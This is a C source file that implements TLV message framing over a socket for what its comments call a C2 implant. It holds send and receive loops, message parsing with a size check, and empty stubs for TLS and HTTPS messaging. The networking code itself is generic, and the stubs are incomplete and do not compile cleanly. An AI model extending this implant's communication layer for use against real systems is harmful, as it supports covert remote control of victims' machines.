#include "protocol.h"

#define SOCKET_SEND_FLAGS 0
#define SOCKET_RECV_FLAGS 0
#define TLV_TYPE_FIELD_OFFSET 0U
#define TLV_LENGTH_FIELD_OFFSET sizeof(DWORD)

/**
 * @brief Sends exactly len bytes on the active socket.
 *
 * This helper loops until the full buffer has been transmitted or a socket
 * error occurs.
 *
 * @param sock The active C2 socket used to send data.
 * @param buf The byte buffer to send.
 * @param len The number of bytes to send.
 *
 * @return TRUE on success, or FALSE if send fails.
 */
static BOOL SendAll(SOCKET sock, CONST CHAR* buf, INT len)
{
	INT sentTotal = 0;

	ASSERT(sock != INVALID_SOCKET);
	ASSERT(buf != NULL);

	while (sentTotal < len)
	{
		INT sent = send(
			sock,
			buf + sentTotal,
			len - sentTotal,
			SOCKET_SEND_FLAGS
		);
		if (sent == SOCKET_ERROR)
		{
			return FALSE;
		}

		sentTotal += sent;
	}

	return TRUE;
}

/**
 * @brief Receives exactly len bytes from the active socket.
 *
 * This helper loops until the full buffer has been read or a socket error
 * occurs.
 *
 * @param sock The active C2 socket used to receive data.
 * @param buf The output buffer to fill.
 * @param len The number of bytes to receive.
 *
 * @return TRUE on success, or FALSE if recv fails or the peer disconnects.
 */
static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
{
	INT recvTotal = 0;

	ASSERT(sock != INVALID_SOCKET);
	ASSERT(buf != NULL);

	while (recvTotal < len)
	{
		INT received = recv(
			sock,
			buf + recvTotal,
			len - recvTotal,
			SOCKET_RECV_FLAGS
		);
		if (received <= 0)
		{
			return FALSE;
		}

		recvTotal += received;
	}

	return TRUE;
}

BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload)
{
	BYTE header[TLV_HEADER_SIZE] = { 0 };

	ASSERT(sock != INVALID_SOCKET);

	*(DWORD*)(header + TLV_TYPE_FIELD_OFFSET) = type;
	*(DWORD*)(header + TLV_LENGTH_FIELD_OFFSET) = payloadLength;

	if (!SendAll(sock, (CONST CHAR*)header, TLV_HEADER_SIZE))
	{
		return FALSE;
	}

	if (payloadLength > 0 && payload != NULL)
	{
		if (!SendAll(sock, (CONST CHAR*)payload, (INT)payloadLength))
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
{
	BYTE header[TLV_HEADER_SIZE] = { 0 };

	ASSERT(sock != INVALID_SOCKET);
	ASSERT(msg != NULL);

	msg->type = 0;
	msg->length = 0;
	msg->value = NULL;

	if (!RecvAll(sock, (CHAR*)header, TLV_HEADER_SIZE))
	{
		return FALSE;
	}

	msg->type = *(DWORD*)(header + TLV_TYPE_FIELD_OFFSET);
	msg->length = *(DWORD*)(header + TLV_LENGTH_FIELD_OFFSET);

	if (msg->length >= MAX_MESSAGE_SIZE)
	{
		return FALSE;
	}

	if (msg->length > 0)
	{
		msg->value = (PBYTE)ImplantHeapAlloc((SIZE_T)msg->length);
		if (msg->value == NULL)
		{
			return FALSE;
		}

		if (!RecvAll(sock, (CHAR*)msg->value, (INT)msg->length))
		{
			ImplantHeapFree(msg->value);
			msg->value = NULL;
			return FALSE;
		}
	}

	return TRUE;
}

VOID FreeTlvMessage(TLV_MESSAGE* msg)
{
	ASSERT(msg != NULL);

	if (msg->value != NULL)
	{
		ImplantHeapFree(msg->value);
		msg->value = NULL;
	}
}

BOOL DecryptTLSMessage() {}
BOOL EncryptTLSMessage() {}

BOOL SendHttpsMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload) {



}


VOID FreeHttpsMessage(TLV_MESSAGE* msg) {


}